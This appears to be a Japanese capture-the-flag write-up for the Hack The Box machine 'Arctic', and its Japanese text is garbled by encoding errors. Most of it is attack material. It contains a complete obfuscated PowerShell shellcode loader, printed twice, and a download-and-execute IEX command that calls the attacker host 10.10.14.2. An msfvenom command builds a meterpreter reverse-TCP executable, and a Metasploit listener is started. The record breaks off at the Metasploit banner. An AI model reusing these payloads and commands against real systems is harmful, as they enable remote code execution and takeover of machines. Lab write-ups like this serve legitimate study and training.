powershell /w 1 /C "s\"\"v IJi -;s\"\"v zx e\"\"c;s\"\"v Aac ((g\"\"v IJi).value.toString()+(g\"\"v zx).value.toString());powershell (g\"\"v Aac).value.toString() ('JABvAGcAPQAnACQAbgBtAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAeQBuAEEAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlACIAKwAiAGwAIgArACIAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABhAEMAcgAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQAiACsAIgBsACIAKwAiADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABoAHoAWAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAbgBtAD0AJABuAG0ALgByAGUAcABsAGEAYwBlACgAIgBhAEMAcgAiACwAIAAiAEMAcgBlAGEAdABlAFQAaAByACIAKwAiAGUAIgArACIAYQBkACIAKQA7ACQAbgBtAD0AJABuAG0ALgByAGUAcABsAGEAYwBlACgAIgB5AG4AQQAiACwAIAAiAGMAYQBsAGwAbwBjACIAKQA7ACQAdABSAD0AIgB9AGUAOAAsAH0AOAAyACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGMAMAAsAH0ANgA0ACwAfQA4AGIALAB9ADUAMAAsAH0AMwAwACwAfQA4AGIALAB9ADUAMgAsAH0AMABjACwAfQA4AGIALAB9ADUAMgAsAH0AMQA0ACwAfQA4AGIALAB9ADcAMgAsAH0AMgA4ACwAfQAwAGYALAB9AGIANwAsAH0ANABhACwAfQAyADYALAB9ADMAMQAsAH0AZgBmACwAfQBhAGMALAB9ADMAYwAsAH0ANgAxACwAfQA3AGMALAB9ADAAMgAsAH0AMgBjACwAfQAyADAALAB9AGMAMQAsAH0AYwBmACwAfQAwAGQALAB9ADAAMQAsAH0AYwA3ACwAfQBlADIALAB9AGYAMgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANABhACwAfQAzAGMALAB9ADgAYgAsAH0ANABjACwAfQAxADEALAB9ADcAOAAsAH0AZQAzACwAfQA0ADgALAB9ADAAMQAsAH0AZAAxACwAfQA1ADEALAB9ADgAYgAsAH0ANQA5ACwAfQAyADAALAB9ADAAMQAsAH0AZAAzACwAfQA4AGIALAB9ADQAOQAsAH0AMQA4ACwAfQBlADMALAB9ADMAYQAsAH0ANAA5ACwAfQA4AGIALAB9ADMANAAsAH0AOABiACwAfQAwADEALAB9AGQANgAsAH0AMwAxACwAfQBmAGYALAB9AGEAYwAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AMAAxACwAfQBjADcALAB9ADMAOAAsAH0AZQAwACwAfQA3ADUALAB9AGYANgAsAH0AMAAzACwAfQA3AGQALAB9AGYAOAAsAH0AMwBiACwAfQA3AGQALAB9ADIANAAsAH0ANwA1ACwAfQBlADQALAB9ADUAOAAsAH0AOABiACwAfQA1ADgALAB9ADIANAAsAH0AMAAxACwAfQBkADMALAB9ADYANgAsAH0AOABiACwAfQAwAGMALAB9ADQAYgAsAH0AOABiACwAfQA1ADgALAB9ADEAYwAsAH0AMAAxACwAfQBkADMALAB9ADgAYgAsAH0AMAA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAAwACwAfQA4ADkALAB9ADQANAAsAH0AMgA0ACwAfQAyADQALAB9ADUAYgAsAH0ANQBiACwAfQA2ADEALAB9ADUAOQAsAH0ANQBhACwAfQA1ADEALAB9AGYAZgAsAH0AZQAwACwAfQA1AGYALAB9ADUAZgAsAH0ANQBhACwAfQA4AGIALAB9ADEAMgAsAH0AZQBiACwAfQA4AGQALAB9ADUAZAAsAH0ANgA4ACwAfQAzADMALAB9ADMAMgAsAH0AMAAwACwAfQAwADAALAB9ADYAOAAsAH0ANwA3ACwAfQA3ADMALAB9ADMAMgAsAH0ANQBmACwAfQA1ADQALAB9ADYAOAAsAH0ANABjACwAfQA3ADcALAB9ADIANgAsAH0AMAA3ACwAfQA4ADkALAB9AGUAOAAsAH0AZgBmACwAfQBkADAALAB9AGIAOAAsAH0AOQAwACwAfQAwADEALAB9ADAAMAAsAH0AMAAwACwAfQAyADkALAB9AGMANAAsAH0ANQA0ACwAfQA1ADAALAB9ADYAOAAsAH0AMgA5ACwAfQA4ADAALAB9ADYAYgAsAH0AMAAwACwAfQBmAGYALAB9AGQANQAsAH0ANgBhACwAfQAwAGEALAB9ADYAOAAsAH0AMABhACwAfQAwAGEALAB9ADAAYwAsAH0AYwAyACwAfQA2ADgALAB9ADAAMgAsAH0AMAAwACwAfQA3AGEALAB9ADYAOQAsAH0AOAA5ACwAfQBlADYALAB9ADUAMAAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADQAMAAsAH0ANQAwACwAfQA2ADgALAB9AGUAYQAsAH0AMABmACwAfQBkAGYALAB9AGUAMAAsAH0AZgBmACwAfQBkADUALAB9ADkANwAsAH0ANgBhACwAfQAxADAALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADkAOQAsAH0AYQA1ACwAfQA3ADQALAB9ADYAMQAsAH0AZgBmACwAfQBkADUALAB9ADgANQAsAH0AYwAwACwAfQA3ADQALAB9ADAAYwAsAH0AZgBmACwAfQA0AGUALAB9ADAAOAAsAH0ANwA1ACwAfQBlAGMALAB9ADYAOAAsAH0AZgAwACwAfQBiADUALAB9AGEAMgAsAH0ANQA2ACwAfQBmAGYALAB9AGQANQAsAH0ANgBhACwAfQAwADAALAB9ADYAYQAsAH0AMAA0ACwAfQA1ADYALAB9ADUANwAsAH0ANgA4ACwAfQAwADIALAB9AGQAOQAsAH0AYwA4ACwAfQA1AGYALAB9AGYAZgAsAH0AZAA1ACwAfQA4AGIALAB9ADMANgAsAH0ANgBhACwAfQA0ADAALAB9ADYAOAAsAH0AMAAwACwAfQAxADAALAB9ADAAMAAsAH0AMAAwACwAfQA1ADYALAB9ADYAYQAsAH0AMAAwACwAfQA2ADgALAB9ADU'+'AOAAsAH0AYQA0ACwAfQA1ADMALAB9AGUANQAsAH0AZgBmACwAfQBkADUALAB9ADkAMwAsAH0ANQAzACwAfQA2AGEALAB9ADAAMAAsAH0ANQA2ACwAfQA1ADMALAB9ADUANwAsAH0ANgA4ACwAfQAwADIALAB9AGQAOQAsAH0AYwA4ACwAfQA1AGYALAB9AGYAZgAsAH0AZAA1ACwAfQAwADEALAB9AGMAMwAsAH0AMgA5ACwAfQBjADYALAB9ADcANQAsAH0AZQBlACwAfQBjADMAIgA7ACQATgBqAD0AQQBkAGQALQBUAHkAcABlACAALQBwAGEAcwBzACAALQBtACAAJABuAG0AIAAtAE4AYQBtAGUAIAAiAHkAUQAiACAALQBuAGEAbQBlAHMAIABKAGUAYgA7ACQATgBqAD0AJABOAGoALgByAGUAcABsAGEAYwBlACgAIgBKAGUAYgAiACwAIAAiAFcAaQBuADMAMgBGAHUAbgBjAHQAaQAiACsAIgBvACIAKwAiAG4AcwAiACkAOwBbAGIAeQB0AGUAWwBdAF0AJAB0AFIAIAA9ACAAJAB0AFIALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAiAGUAQgBzAEwAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgBlAEIAcwBMACIALAAgACIAMAAiACkALgBTAHAAbABpAHQAKAAiACwAIgApADsAJABUAEEAPQAwAHgAMQAwADAAMgA7AGkAZgAgACgAJAB0AFIALgBMACAALQBnAHQAIAAwAHgAMQAwADAAMgApAHsAJABUAEEAPQAkAHQAUgAuAEwAfQA7ACQAZwBCAD0AJABOAGoAOgA6AGMAYQBsAGwAbwBjACgAMAB4ADEAMAAwADIALAAgADEAKQA7AFsAVQBJAG4AdAA2ADQAXQAkAGgAegBYACAAPQAgADAAOwBmAG8AcgAoACQAcABpAD0AMAA7ACQAcABpACAALQBsAGUAKAAkAHQAUgAuAEwAZQBuAGcAdABoAC0AMQApADsAJABwAGkAKwArACkAewAkAE4AagA6ADoAbQBlAG0AcwBlAHQAKABbAEkAbgB0AFAAdAByAF0AKAAkAGcAQgAuAFQAbwBJAG4AdAAzADIAKAApACsAJABwAGkAKQAsACAAJAB0AFIAWwAkAHAAaQBdACwAIAAxACkAfQA7ACQATgBqADoAOgBWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKAAkAGcAQgAsACAAMAB4ADEAMAAwADIALAAgADAAeAA0ADAALAAgAFsAUgBlAGYAXQAkAGgAegBYACkAOwAkAE4AagA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAB4ADAAMAAsACQAZwBCACwAMAAsADAALAAwACkAOwAnADsAJABoAHUAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAG8AZwApACkAOwAkAFYASQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABCAHYAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAcgBhAGMAIAA9ACAAIgBDADoAXAAkAEIAdgBcAHMAeQBzAHcAbwB3ADYANABcACQAQgB2ACQAVgBJAFwAdgAxAC4AMABcACQAVgBJACIAOwAkAEMAYQBVACAAPQAgACcAVAByAHUAIgArACIAZQAiACsAIgAnADsAaQBmACgAWwBlAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoASQBzADYANABCAGkAdABPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQAgAC0AZQBxACAAJwAkAEMAYQBVACcAKQB7ACQAVgBJAD0AIAAkAHIAYQBjAH0AOwAkAFUAVgA9ACIAIAAkAFYASQAgAHEAUgBoACAAJABoAHUAIgA7ACQAVQBWAD0AJABVAFYALgByAGUAcABsAGEAYwBlACgAIgBxAFIAaAAiACwAIAAiAC0AbgBvAGUAeABpAHQAIAAtAGUAIgApADsAaQBlAHgAIAAkAFUAVgA=')"
```
å®Ÿéš›ã®æ”»æ’ƒã‚³ãƒ¼ãƒ‰ã§ã™ã€‚

## å…ˆã»ã©ã®ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‹ã‚‰powershell_attack.txtã‚’å®Ÿè¡Œ

ã¾ãšã€powershell_attack.txt ã‚’ç·¨é›†ã—ã¦ exploit.html ã¨ã—ã¦ä¿å­˜ã—ã¾ã™ã€‚

```exploit.html
s\"\"v IJi -;s\"\"v zx e\"\"c;s\"\"v Aac ((g\"\"v IJi).value.toString()+(g\"\"v zx).value.toString());powershell (g\"\"v Aac).value.toString() ('JABvAGcAPQAnACQAbgBtAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAeQBuAEEAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlACIAKwAiAGwAIgArACIAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABhAEMAcgAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQAiACsAIgBsACIAKwAiADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABoAHoAWAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAbgBtAD0AJABuAG0ALgByAGUAcABsAGEAYwBlACgAIgBhAEMAcgAiACwAIAAiAEMAcgBlAGEAdABlAFQAaAByACIAKwAiAGUAIgArACIAYQBkACIAKQA7ACQAbgBtAD0AJABuAG0ALgByAGUAcABsAGEAYwBlACgAIgB5AG4AQQAiACwAIAAiAGMAYQBsAGwAbwBjACIAKQA7ACQAdABSAD0AIgB9AGUAOAAsAH0AOAAyACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGMAMAAsAH0ANgA0ACwAfQA4AGIALAB9ADUAMAAsAH0AMwAwACwAfQA4AGIALAB9ADUAMgAsAH0AMABjACwAfQA4AGIALAB9ADUAMgAsAH0AMQA0ACwAfQA4AGIALAB9ADcAMgAsAH0AMgA4ACwAfQAwAGYALAB9AGIANwAsAH0ANABhACwAfQAyADYALAB9ADMAMQAsAH0AZgBmACwAfQBhAGMALAB9ADMAYwAsAH0ANgAxACwAfQA3AGMALAB9ADAAMgAsAH0AMgBjACwAfQAyADAALAB9AGMAMQAsAH0AYwBmACwAfQAwAGQALAB9ADAAMQAsAH0AYwA3ACwAfQBlADIALAB9AGYAMgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANABhACwAfQAzAGMALAB9ADgAYgAsAH0ANABjACwAfQAxADEALAB9ADcAOAAsAH0AZQAzACwAfQA0ADgALAB9ADAAMQAsAH0AZAAxACwAfQA1ADEALAB9ADgAYgAsAH0ANQA5ACwAfQAyADAALAB9ADAAMQAsAH0AZAAzACwAfQA4AGIALAB9ADQAOQAsAH0AMQA4ACwAfQBlADMALAB9ADMAYQAsAH0ANAA5ACwAfQA4AGIALAB9ADMANAAsAH0AOABiACwAfQAwADEALAB9AGQANgAsAH0AMwAxACwAfQBmAGYALAB9AGEAYwAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AMAAxACwAfQBjADcALAB9ADMAOAAsAH0AZQAwACwAfQA3ADUALAB9AGYANgAsAH0AMAAzACwAfQA3AGQALAB9AGYAOAAsAH0AMwBiACwAfQA3AGQALAB9ADIANAAsAH0ANwA1ACwAfQBlADQALAB9ADUAOAAsAH0AOABiACwAfQA1ADgALAB9ADIANAAsAH0AMAAxACwAfQBkADMALAB9ADYANgAsAH0AOABiACwAfQAwAGMALAB9ADQAYgAsAH0AOABiACwAfQA1ADgALAB9ADEAYwAsAH0AMAAxACwAfQBkADMALAB9ADgAYgAsAH0AMAA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAAwACwAfQA4ADkALAB9ADQANAAsAH0AMgA0ACwAfQAyADQALAB9ADUAYgAsAH0ANQBiACwAfQA2ADEALAB9ADUAOQAsAH0ANQBhACwAfQA1ADEALAB9AGYAZgAsAH0AZQAwACwAfQA1AGYALAB9ADUAZgAsAH0ANQBhACwAfQA4AGIALAB9ADEAMgAsAH0AZQBiACwAfQA4AGQALAB9ADUAZAAsAH0ANgA4ACwAfQAzADMALAB9ADMAMgAsAH0AMAAwACwAfQAwADAALAB9ADYAOAAsAH0ANwA3ACwAfQA3ADMALAB9ADMAMgAsAH0ANQBmACwAfQA1ADQALAB9ADYAOAAsAH0ANABjACwAfQA3ADcALAB9ADIANgAsAH0AMAA3ACwAfQA4ADkALAB9AGUAOAAsAH0AZgBmACwAfQBkADAALAB9AGIAOAAsAH0AOQAwACwAfQAwADEALAB9ADAAMAAsAH0AMAAwACwAfQAyADkALAB9AGMANAAsAH0ANQA0ACwAfQA1ADAALAB9ADYAOAAsAH0AMgA5ACwAfQA4ADAALAB9ADYAYgAsAH0AMAAwACwAfQBmAGYALAB9AGQANQAsAH0ANgBhACwAfQAwAGEALAB9ADYAOAAsAH0AMABhACwAfQAwAGEALAB9ADAAYwAsAH0AYwAyACwAfQA2ADgALAB9ADAAMgAsAH0AMAAwACwAfQA3AGEALAB9ADYAOQAsAH0AOAA5ACwAfQBlADYALAB9ADUAMAAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADQAMAAsAH0ANQAwACwAfQA2ADgALAB9AGUAYQAsAH0AMABmACwAfQBkAGYALAB9AGUAMAAsAH0AZgBmACwAfQBkADUALAB9ADkANwAsAH0ANgBhACwAfQAxADAALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADkAOQAsAH0AYQA1ACwAfQA3ADQALAB9ADYAMQAsAH0AZgBmACwAfQBkADUALAB9ADgANQAsAH0AYwAwACwAfQA3ADQALAB9ADAAYwAsAH0AZgBmACwAfQA0AGUALAB9ADAAOAAsAH0ANwA1ACwAfQBlAGMALAB9ADYAOAAsAH0AZgAwACwAfQBiADUALAB9AGEAMgAsAH0ANQA2ACwAfQBmAGYALAB9AGQANQAsAH0ANgBhACwAfQAwADAALAB9ADYAYQAsAH0AMAA0ACwAfQA1ADYALAB9ADUANwAsAH0ANgA4ACwAfQAwADIALAB9AGQAOQAsAH0AYwA4ACwAfQA1AGYALAB9AGYAZgAsAH0AZAA1ACwAfQA4AGIALAB9ADMANgAsAH0ANgBhACwAfQA0ADAALAB9ADYAOAAsAH0AMAAwACwAfQAxADAALAB9ADAAMAAsAH0AMAAwACwAfQA1ADYALAB9ADYAYQAsAH0AMAAwACwAfQA2ADgALAB9ADU'+'AOAAsAH0AYQA0ACwAfQA1ADMALAB9AGUANQAsAH0AZgBmACwAfQBkADUALAB9ADkAMwAsAH0ANQAzACwAfQA2AGEALAB9ADAAMAAsAH0ANQA2ACwAfQA1ADMALAB9ADUANwAsAH0ANgA4ACwAfQAwADIALAB9AGQAOQAsAH0AYwA4ACwAfQA1AGYALAB9AGYAZgAsAH0AZAA1ACwAfQAwADEALAB9AGMAMwAsAH0AMgA5ACwAfQBjADYALAB9ADcANQAsAH0AZQBlACwAfQBjADMAIgA7ACQATgBqAD0AQQBkAGQALQBUAHkAcABlACAALQBwAGEAcwBzACAALQBtACAAJABuAG0AIAAtAE4AYQBtAGUAIAAiAHkAUQAiACAALQBuAGEAbQBlAHMAIABKAGUAYgA7ACQATgBqAD0AJABOAGoALgByAGUAcABsAGEAYwBlACgAIgBKAGUAYgAiACwAIAAiAFcAaQBuADMAMgBGAHUAbgBjAHQAaQAiACsAIgBvACIAKwAiAG4AcwAiACkAOwBbAGIAeQB0AGUAWwBdAF0AJAB0AFIAIAA9ACAAJAB0AFIALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAiAGUAQgBzAEwAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgBlAEIAcwBMACIALAAgACIAMAAiACkALgBTAHAAbABpAHQAKAAiACwAIgApADsAJABUAEEAPQAwAHgAMQAwADAAMgA7AGkAZgAgACgAJAB0AFIALgBMACAALQBnAHQAIAAwAHgAMQAwADAAMgApAHsAJABUAEEAPQAkAHQAUgAuAEwAfQA7ACQAZwBCAD0AJABOAGoAOgA6AGMAYQBsAGwAbwBjACgAMAB4ADEAMAAwADIALAAgADEAKQA7AFsAVQBJAG4AdAA2ADQAXQAkAGgAegBYACAAPQAgADAAOwBmAG8AcgAoACQAcABpAD0AMAA7ACQAcABpACAALQBsAGUAKAAkAHQAUgAuAEwAZQBuAGcAdABoAC0AMQApADsAJABwAGkAKwArACkAewAkAE4AagA6ADoAbQBlAG0AcwBlAHQAKABbAEkAbgB0AFAAdAByAF0AKAAkAGcAQgAuAFQAbwBJAG4AdAAzADIAKAApACsAJABwAGkAKQAsACAAJAB0AFIAWwAkAHAAaQBdACwAIAAxACkAfQA7ACQATgBqADoAOgBWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKAAkAGcAQgAsACAAMAB4ADEAMAAwADIALAAgADAAeAA0ADAALAAgAFsAUgBlAGYAXQAkAGgAegBYACkAOwAkAE4AagA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAB4ADAAMAAsACQAZwBCACwAMAAsADAALAAwACkAOwAnADsAJABoAHUAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAG8AZwApACkAOwAkAFYASQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABCAHYAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAcgBhAGMAIAA9ACAAIgBDADoAXAAkAEIAdgBcAHMAeQBzAHcAbwB3ADYANABcACQAQgB2ACQAVgBJAFwAdgAxAC4AMABcACQAVgBJACIAOwAkAEMAYQBVACAAPQAgACcAVAByAHUAIgArACIAZQAiACsAIgAnADsAaQBmACgAWwBlAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoASQBzADYANABCAGkAdABPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQAgAC0AZQBxACAAJwAkAEMAYQBVACcAKQB7ACQAVgBJAD0AIAAkAHIAYQBjAH0AOwAkAFUAVgA9ACIAIAAkAFYASQAgAHEAUgBoACAAJABoAHUAIgA7ACQAVQBWAD0AJABVAFYALgByAGUAcABsAGEAYwBlACgAIgBxAFIAaAAiACwAIAAiAC0AbgBvAGUAeABpAHQAIAAtAGUAIgApADsAaQBlAHgAIAAkAFUAVgA=')
```

powershell_attack.txt ã‹ã‚‰ã®å¤‰æ›´ç‚¹ã¯
ãƒ»ä¸€ç•ªå¾Œã‚ã® `"` ã‚’æŠœã
ãƒ»å¯¾å¿œã™ã‚‹ã¯ã˜ã‚ã®æ–¹ã® `"` ã‚‚æŠœã
ãƒ»ã¯ã˜ã‚ã® `powershell /w 1 /C ` ã‚‚æŠœã

ã§ã™ã€‚

ãã—ã¦ python ã§ local ã‚µãƒ¼ãƒãƒ¼ã‚’ç«‹ã¦ã¾ã™ã€‚

```
$ python -m SimpleHTTPServer
```

unicorn.rc ã‚’ä½¿ã£ã¦ msfconsole ã‚‚ç«‹ã¦ã¦ãŠãã¾ã™ã€‚
```
$ msfconsole -r unicorn.rc
```

ãã—ã¦å…ˆã»ã©ã®ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‹ã‚‰ `exploit.html` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãã®å†…å®¹ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

```
C:\ColdFusion8\runtime\bin> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:8000/exploit.html')"
```

## ã—ã‹ã—
ã“ã‚ŒãŒã¾ã‚å¤±æ•—ã™ã‚‹ã‚“ã§ã™ã‚â€¦
server ã¯ 200 ã§ãƒ¬ã‚¹ãƒãƒ³ã‚¹è¿”ã—ã¦ã„ã‚‹ã®ã§ã€`exploit.html`ãŒãªã‚“ã‹ãƒŸã‚¹ã£ã¦ã‚‹ã‹ã€unicorn ã®è¨­å®šã§ãƒŸã‚¹ã£ãŸã‹ãªã‚ˆã†ãªæ°—ãŒã™ã‚‹ã‚“ã§ã™ãŒã€å‰²ã¨ã—ã£ã‹ã‚Šç›®ã«è¦‹ç›´ã—ã¦ã‚‚åŸå› ãŒã‚ã‹ã‚Šã¾ã›ã‚“ã§ã—ãŸâ€¦

## ä½œæˆ¦å¤‰æ›´ â†’ msfvenomã‚’ä½¿ã†

### msfvenomã‚’ä½¿ã†
â€»ã“ã“ã‹ã‚‰ä»Šã¾ã§
LHOST=10.10.14.2
ã ã£ãŸã®ãŒ
LHOST=10.10.14.13
ã«å¤‰ã‚ã£ã¦ã„ã¾ã™ã€‚

ä»¥ä¸‹ã® writeup ã‚’å‚è€ƒã«ã—ã¾ã™ã€‚
[Hack the Box Writeup: Arctic](https://offsecdeer.gitlab.io/post/htb-writeup-arctic/)

```
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=9090 -f exe > arctic.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes

kali@kali:~$ python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
```
### metaspoitã§å¾…ã¡å—ã‘ã‚‹

```
kali@kali:~$ msfconsole
[-] ***rting the Metasploit Framework console...|
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                                                                                                                        
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                                                                      
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                                                                     
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                                    
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                                                                    
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                                                                    
  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                                                                                                    
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                                                                                                    
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc                                                                                                                                     
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                                                                      
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                                                                       
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;                                                                                                                                        
       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                                                                         
         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                                                                           
           :kk;.OOOOOOOOOOOOO.cOk:                                                                                                                                             
             ;kOOOOOOOOOOOOOOOk:                                                                                                                                               
               ,xOOOOOOOOOOOx,                                                                                                                                                 
                 .lOOOOOOOl.                                                                                                                                                   
                    ,dOd,                                                                                                                                                      
                      .                                                                                                                                                        

       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
